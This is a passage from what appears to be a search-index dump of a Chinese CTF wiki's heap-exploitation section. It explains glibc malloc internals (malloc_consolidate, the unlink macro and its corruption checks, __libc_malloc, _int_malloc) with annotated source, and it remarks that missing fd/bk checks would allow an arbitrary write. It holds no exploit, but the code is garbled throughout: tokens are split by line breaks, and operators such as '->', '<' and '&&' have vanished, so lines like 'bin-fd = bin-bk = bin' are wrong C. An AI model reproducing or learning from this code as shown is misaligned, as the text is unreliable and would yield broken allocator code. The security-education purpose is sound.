to inline it at all call points, which turns out not to be an\n\n\n   optimization at all. (Inlining it in malloc_consolidate is fine though.)\n\n\n */\n\n\n\nstatic\n \nvoid\n \nmalloc_init_state\n(\nmstate\n \nav\n)\n \n{\n\n    \nint\n     \ni\n;\n\n    \nmbinptr\n \nbin\n;\n\n\n    \n/* Establish circular links for normal bins */\n\n    \nfor\n \n(\ni\n \n=\n \n1\n;\n \ni\n \n \nNBINS\n;\n \n++\ni\n)\n \n{\n\n        \nbin\n     \n=\n \nbin_at\n(\nav\n,\n \ni\n);\n\n        \nbin\n-\nfd\n \n=\n \nbin\n-\nbk\n \n=\n \nbin\n;\n\n    \n}\n\n\n\n#if MORECORE_CONTIGUOUS\n\n    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n\n\n#endif\n\n        \nset_noncontiguous\n(\nav\n);\n\n    \nif\n \n(\nav\n \n==\n \nmain_arena\n)\n \nset_max_fast\n(\nDEFAULT_MXFAST\n);\n\n    \n// \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk\n\n    \nav\n-\nflags\n \n|=\n \nFASTCHUNKS_BIT\n;\n\n    \n// \u5c31\u662f unsorted bin\n\n    \nav\n-\ntop\n \n=\n \ninitial_top\n(\nav\n);\n\n\n}\n\n\n\n\n\nmalloc_consolidate\n\n\n\u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd\n\n\n\n\n\u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002\n\n\n\u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002\n\n\n\n\n\u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b\n\n\n\u521d\u59cb\n\n\nstatic\n \nvoid\n \nmalloc_consolidate\n(\nmstate\n \nav\n)\n \n{\n\n    \nmfastbinptr\n \n*\nfb\n;\n             \n/* current fastbin being consolidated */\n\n    \nmfastbinptr\n \n*\nmaxfb\n;\n          \n/* last fastbin (for loop control) */\n\n    \nmchunkptr\n    \np\n;\n              \n/* current chunk being consolidated */\n\n    \nmchunkptr\n    \nnextp\n;\n          \n/* next chunk to consolidate */\n\n    \nmchunkptr\n    \nunsorted_bin\n;\n   \n/* bin header */\n\n    \nmchunkptr\n    \nfirst_unsorted\n;\n \n/* chunk to link to */\n\n\n    \n/* These have same use as in free() */\n\n    \nmchunkptr\n       \nnextchunk\n;\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n\n    \nINTERNAL_SIZE_T\n \nnextsize\n;\n\n    \nINTERNAL_SIZE_T\n \nprevsize\n;\n\n    \nint\n             \nnextinuse\n;\n\n    \nmchunkptr\n       \nbck\n;\n\n    \nmchunkptr\n       \nfwd\n;\n\n\n\n\n\n\u5408\u5e76 chunk\n\n\n    \n/*\n\n\n      If max_fast is 0, we know that av hasn\nt\n\n\n      yet been initialized, in which case do so below\n\n\n    */\n\n    \n// \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316\n\n    \nif\n \n(\nget_max_fast\n()\n \n!=\n \n0\n)\n \n{\n\n        \n// \u6e05\u7a7a fastbin \u6807\u8bb0\n\n        \n// \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002\n\n        \nclear_fastchunks\n(\nav\n);\n\n        \n// \n\n        \nunsorted_bin\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n        \n/*\n\n\n          Remove each chunk from fast bin and consolidate it, placing it\n\n\n          then in unsorted bin. Among other reasons for doing this,\n\n\n          placing in unsorted bin avoids needing to calculate actual bins\n\n\n          until malloc is sure that chunks aren\nt immediately going to be\n\n\n          reused anyway.\n\n\n        */\n\n        \n// \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002\n\n        \nmaxfb\n \n=\n \nfastbin\n(\nav\n,\n \nNFASTBINS\n \n-\n \n1\n);\n\n        \nfb\n    \n=\n \nfastbin\n(\nav\n,\n \n0\n);\n\n        \ndo\n \n{\n\n            \np\n \n=\n \natomic_exchange_acq\n(\nfb\n,\n \nNULL\n);\n\n            \nif\n \n(\np\n \n!=\n \n0\n)\n \n{\n\n                \ndo\n \n{\n\n                    \ncheck_inuse_chunk\n(\nav\n,\n \np\n);\n\n                    \nnextp\n \n=\n \np\n-\nfd\n;\n\n\n                    \n/* Slightly streamlined version of consolidation code in\n\n\n                     * free() */\n\n                    \nsize\n      \n=\n \nchunksize\n(\np\n);\n\n                    \nnextchunk\n \n=\n \nchunk_at_offset\n(\np\n,\n \nsize\n);\n\n                    \nnextsize\n  \n=\n \nchunksize\n(\nnextchunk\n);\n\n\n                    \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n                        \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n                        \nsize\n \n+=\n \nprevsize\n;\n\n                        \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n                        \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n                    \n}\n\n\n                    \nif\n \n(\nnextchunk\n \n!=\n \nav\n-\ntop\n)\n \n{\n\n                        \n// \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002\n\n                        \nnextinuse\n \n=\n \ninuse_bit_at_offset\n(\nnextchunk\n,\n \nnextsize\n);\n\n\n                        \nif\n \n(\n!\nnextinuse\n)\n \n{\n\n                            \nsize\n \n+=\n \nnextsize\n;\n\n                            \nunlink\n(\nav\n,\n \nnextchunk\n,\n \nbck\n,\n \nfwd\n);\n\n                        \n}\n \nelse\n\n                         \n// \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002\n\n                            \nclear_inuse_bit_at_offset\n(\nnextchunk\n,\n \n0\n);\n\n\n                        \nfirst_unsorted\n     \n=\n \nunsorted_bin\n-\nfd\n;\n\n                        \nunsorted_bin\n-\nfd\n   \n=\n \np\n;\n\n                        \nfirst_unsorted\n-\nbk\n \n=\n \np\n;\n\n\n                        \nif\n \n(\n!\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                            \np\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                            \np\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                        \n}\n\n\n                        \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n                        \np\n-\nbk\n \n=\n \nunsorted_bin\n;\n\n                        \np\n-\nfd\n \n=\n \nfirst_unsorted\n;\n\n                        \nset_foot\n(\np\n,\n \nsize\n);\n\n                    \n}\n\n\n                    \nelse\n \n{\n\n                        \nsize\n \n+=\n \nnextsize\n;\n\n                        \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n                        \nav\n-\ntop\n \n=\n \np\n;\n\n                    \n}\n\n\n                \n}\n \nwhile\n \n((\np\n \n=\n \nnextp\n)\n \n!=\n \n0\n);\n\n            \n}\n\n        \n}\n \nwhile\n \n(\nfb\n++\n \n!=\n \nmaxfb\n);\n\n\n\n\n\n\u521d\u59cb\u5316\n\n\n\u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n\n    \n}\n \nelse\n \n{\n\n        \nmalloc_init_state\n(\nav\n);\n\n        \n// \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002\n\n        \ncheck_malloc_state\n(\nav\n);\n\n    \n}\n\n\n\n\n\n\u6d4b\u8bd5\u652f\u6301\n\n\n\u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002\n\n\nstatic\n \nint\n \nperturb_byte\n;\n\n\n\nstatic\n \nvoid\n \nalloc_perturb\n(\nchar\n \n*\np\n,\n \nsize_t\n \nn\n)\n \n{\n\n    \nif\n \n(\n__glibc_unlikely\n(\nperturb_byte\n))\n \nmemset\n(\np\n,\n \nperturb_byte\n \n^\n \n0xff\n,\n \nn\n);\n\n\n}\n\n\n\nstatic\n \nvoid\n \nfree_perturb\n(\nchar\n \n*\np\n,\n \nsize_t\n \nn\n)\n \n{\n\n    \nif\n \n(\n__glibc_unlikely\n(\nperturb_byte\n))\n \nmemset\n(\np\n,\n \nperturb_byte\n,\n \nn\n);\n\n\n}", 
            "title": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_1", 
            "text": "\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u79bb\u4e0d\u5f00\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u95ee\u9898   \u5b8f\u89c2\u89d2\u5ea6  \u521b\u5efa\u5806  \u5806\u521d\u59cb\u5316  \u5220\u9664\u5806    \u5fae\u89c2\u89d2\u5ea6  \u7533\u8bf7\u5185\u5b58\u5757  \u91ca\u653e\u5185\u5b58\u5757     \u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u8fd8\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u7684\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002", 
            "title": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_2", 
            "text": "", 
            "title": "\u5806\u5b9e\u73b0\u6982\u89c8"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_3", 
            "text": "\u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1  malloc_state \u76f8\u5173\u51fd\u6570 \u3002", 
            "title": "\u5806\u521d\u59cb\u5316"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_4", 
            "text": "", 
            "title": "\u521b\u5efa\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_5", 
            "text": "", 
            "title": "\u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#unlink", 
            "text": "unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411 bin \u94fe\u8868\u4e2d\u7684\u4e00\u4e2a chunk \u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528   malloc  \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002  \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002  \u4f9d\u6b21\u904d\u5386\u5904\u7406unsorted bin\u65f6\u4e5f\u662f\u6ca1\u6709unlink\u7684\u3002    \u4ece\u6bd4\u6240\u9700\u8981\u7684 chunk \u76f8\u5e94\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002    Free  \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002  \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002    malloc_consolidate  \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002  \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002    realloc  \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002     \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b  /* Take a chunk off a bin list */  #define unlink(AV, P, BK, FD) {                                            \\       // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\\n     FD   =   P - fd ;                                                                       \\\n     BK   =   P - bk ;                                                                       \\\n     // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 \n     if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n       malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n     else   {                                                                       \\\n         FD - bk   =   BK ;                                                               \\\n         BK - fd   =   FD ;                                                               \\\n         // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 \n         if   ( ! in_smallbin_range   ( chunksize_nomask   ( P ))                               \\\n             // \u5982\u679cP- fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 largbin \u94fe\u8868\u4e2d\u3002 \n             // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 \n             // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 \n               __builtin_expect   ( P - fd_nextsize   !=   NULL ,   0 ))   {                       \\\n             // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def \n             if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );                                               \\\n             // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 \n             // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d \n             if   ( FD - fd_nextsize   ==   NULL )   {                                       \\\n                 // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P \n                 // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 \n                 if   ( P - fd_nextsize   ==   P )                                       \\\n                   FD - fd_nextsize   =   FD - bk_nextsize   =   FD ;                       \\\n                 else   {                                                               \\\n                 // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d \n                     FD - fd_nextsize   =   P - fd_nextsize ;                               \\\n                     FD - bk_nextsize   =   P - bk_nextsize ;                               \\\n                     P - fd_nextsize - bk_nextsize   =   FD ;                               \\\n                     P - bk_nextsize - fd_nextsize   =   FD ;                               \\\n                   }                                                               \\\n               }   else   {                                                               \\\n                 // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef \n                 P - fd_nextsize - bk_nextsize   =   P - bk_nextsize ;                       \\\n                 P - bk_nextsize - fd_nextsize   =   P - fd_nextsize ;                       \\\n               }                                                                       \\\n           }                                                                       \\\n       }                                                                               \\ }   \u8fd9\u91cc\u6211\u4eec\u53ea\u662f\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002   \u53ef\u4ee5\u770b\u51fa\uff0c  P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\u3002  \u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u505a\u4e86\u76f8\u5e94\u7684\u68c0\u6d4b\u3002  // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n\n   // next_size related \n               if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );      \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002  \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2achunk\u7684\u8bdd\u6240\u8bb0\u5f55\u7684prev_inuse\u4f4d\u9ed8\u8ba4\u4e3a1\u3002", 
            "title": "unlink"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_6", 
            "text": "\u6211\u4eec\u4e4b\u524d\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u6211\u4eec\u4ed4\u7ec6\u770b\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5b9e\u73b0\u3002", 
            "title": "\u7533\u8bf7\u5185\u5b58\u5757"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#__libc_malloc", 
            "text": "\u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\u3002\u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u8fdb\u7a0b\u5728\u521b\u5efa\u65b0\u7ebf\u7a0b\u8fc7\u7a0b\u4e2d\u5206\u914d\u5185\u5b58\u6216\u8005\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5206\u914d\u51fd\u6570\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002  // wapper for int_malloc  void   * __libc_malloc ( size_t   bytes )   { \n     mstate   ar_ptr ; \n     void   *   victim ; \n     // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. \n     void   * ( * hook )( size_t ,   const   void   * )   =   atomic_forced_read ( __malloc_hook ); \n     if   ( __builtin_expect ( hook   !=   NULL ,   0 )) \n         return   ( * hook )( bytes ,   RETURN_ADDRESS ( 0 ));   \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002       arena_get ( ar_ptr ,   bytes );   \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002       victim   =   _int_malloc ( ar_ptr ,   bytes );   \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002       /* Retry with another arena only if we were able to find a usable arena         before.  */ \n     if   ( ! victim     ar_ptr   !=   NULL )   { \n         LIBC_PROBE ( memory_malloc_retry ,   1 ,   bytes ); \n         ar_ptr   =   arena_get_retry ( ar_ptr ,   bytes ); \n         victim   =   _int_malloc ( ar_ptr ,   bytes ); \n     }   \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002       if   ( ar_ptr   !=   NULL )   __libc_lock_unlock ( ar_ptr - mutex );   \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0c\u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58\uff0c\u8981\u4e48\u662f mmap \u7684\u5185\u5b58\uff0c \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d \u3002       assert ( ! victim   ||   chunk_is_mmapped ( mem2chunk ( victim ))   || \n            ar_ptr   ==   arena_for_chunk ( mem2chunk ( victim )));   \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002       return   victim ;  }", 
            "title": "__libc_malloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_int_malloc", 
            "text": "_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b   \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5757\u7684\u5927\u5c0f\u4ee5\u53ca\u76f8\u5e94\u5927\u5c0f chunk \u4f7f\u7528\u7684\u9891\u5ea6\uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002  \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u9700\u6c42\u3002  \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002  \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002   \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002  static   void   * _int_malloc ( mstate   av ,   size_t   bytes )   { \n     INTERNAL_SIZE_T   nb ;    /* normalized request size */ \n     unsigned   int      idx ;   /* associated bin index */ \n     mbinptr           bin ;   /* associated bin */ \n\n     mchunkptr         victim ;         /* inspected/selected chunk */ \n     INTERNAL_SIZE_T   size ;           /* its size */ \n     int               victim_index ;   /* its bin index */ \n\n     mchunkptr       remainder ;        /* remainder from a split */ \n     unsigned   long   remainder_size ;   /* its size */ \n\n     unsigned   int   block ;   /* bit map traverser */ \n     unsigned   int   bit ;     /* bit map traverser */ \n     unsigned   int   map ;     /* current word of binmap */ \n\n     mchunkptr   fwd ;   /* misc temp for linking */ \n     mchunkptr   bck ;   /* misc temp for linking */ \n\n     const   char   * errstr   =   NULL ; \n\n     /*         Convert request size to internal form by adding SIZE_SZ bytes         overhead plus possibly more to obtain necessary alignment and/or         to obtain a size of at least MINSIZE, the smallest allocatable         size. Also, checked_request2size traps (returning 0) request sizes         that are so large that they wrap around zero when padded and         aligned.       */ \n\n     checked_request2size ( bytes ,   nb );", 
            "title": "_int_malloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#arena", 
            "text": "/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from         mmap.  */ \n     if   ( __glibc_unlikely ( av   ==   NULL ))   { \n         void   * p   =   sysmalloc ( nb ,   av ); \n         if   ( p   !=   NULL )   alloc_perturb ( p ,   bytes ); \n         return   p ; \n     }", 
            "title": "arena"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#fast-bin", 
